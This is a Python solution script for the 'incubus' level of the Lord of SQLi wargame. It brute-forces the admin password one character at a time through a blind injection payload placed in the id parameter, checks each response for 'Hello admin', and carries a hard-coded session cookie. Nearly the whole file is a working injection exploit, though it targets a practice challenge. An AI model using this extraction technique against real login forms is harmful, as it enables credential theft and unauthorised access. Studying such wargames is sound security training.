# lordofsqli: incubus
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php'
cookies = {'PHPSESSID': 'vboarv46gs86k84bu0sj74svqe'}

charset = digits + ascii_lowercase
passwd = ''

finish = False
while not finish:
    finish = True
    for c in charset:
        print(c, end='', flush=True)

        payload = {'id': "admin' && obj.pw[{}] == '{}';'".format(len(passwd), c)}
        r = requests.get(url, payload, cookies=cookies)
    
        if 'Hello admin' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break

print('\n->' + passwd)
